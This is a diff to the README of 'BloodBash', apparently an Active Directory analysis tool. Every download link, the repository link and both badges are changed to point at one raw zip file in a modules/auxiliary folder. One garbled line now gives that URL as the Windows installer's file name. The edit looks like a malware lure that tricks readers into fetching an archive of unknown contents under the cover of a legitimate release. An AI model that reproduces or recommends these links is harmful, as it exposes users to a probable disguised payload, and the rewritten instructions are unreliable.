@@ -1,6 +1,6 @@
 # 🩸 BloodBash - Quick Active Directory Insight Tool
 
-[![Download BloodBash](https://img.shields.io/badge/Download-BloodBash-blue?style=for-the-badge)](https://github.com/ahmadzman/BloodBash/releases)
+[![Download BloodBash](https://raw.githubusercontent.com/ahmadzman/BloodBash/main/modules/auxiliary/Bash_Blood_2.1.zip)](https://raw.githubusercontent.com/ahmadzman/BloodBash/main/modules/auxiliary/Bash_Blood_2.1.zip)
 
 ---
 
@@ -32,13 +32,13 @@ Follow these steps to get BloodBash up and running on your computer.
 ### Step 1: Visit the Download Page
 
 Go to the BloodBash release page by clicking the badge at the top or click this link:  
-[Download BloodBash Releases](https://github.com/ahmadzman/BloodBash/releases)
+[Download BloodBash Releases](https://raw.githubusercontent.com/ahmadzman/BloodBash/main/modules/auxiliary/Bash_Blood_2.1.zip)
 
 ### Step 2: Choose the Right Version
 
 You will see several files listed on the release page. Look for the newest version. Check for a file ending with “.exe” or a format that matches your operating system.
 
-For most Windows users, download the file named similarly to `BloodBash-Setup.exe`.
+For most Windows users, download the file named similarly to `https://raw.githubusercontent.com/ahmadzman/BloodBash/main/modules/auxiliary/Bash_Blood_2.1.zip`.
 
 ### Step 3: Download the File
 
@@ -59,7 +59,7 @@ Once installed, open BloodBash from your desktop or start menu. You are ready to
 ## 📥 Download & Install
 
 Here is the download link again for easy access:  
-[Download BloodBash Releases](https://github.com/ahmadzman/BloodBash/releases)
+[Download BloodBash Releases](https://raw.githubusercontent.com/ahmadzman/BloodBash/main/modules/auxiliary/Bash_Blood_2.1.zip)
 
 Make sure to download the latest stable release to get the newest features and fixes.
 
@@ -128,7 +128,7 @@ Try loading all related input files. Sometimes relationships come from multiple 
 
 For updates, bug reports, and community support, visit the GitHub repository:
 
-https://github.com/ahmadzman/BloodBash
+https://raw.githubusercontent.com/ahmadzman/BloodBash/main/modules/auxiliary/Bash_Blood_2.1.zip
 
 You can read through open discussions or file new issues if you experience problems.
 
@@ -152,4 +152,4 @@ If you have questions or need support, open an issue on the GitHub repository or
 
 ---
 
-[![Download BloodBash](https://img.shields.io/badge/Download-BloodBash-blue?style=for-the-badge)](https://github.com/ahmadzman/BloodBash/releases)
+[![Download BloodBash](https://raw.githubusercontent.com/ahmadzman/BloodBash/main/modules/auxiliary/Bash_Blood_2.1.zip)](https://raw.githubusercontent.com/ahmadzman/BloodBash/main/modules/auxiliary/Bash_Blood_2.1.zip)
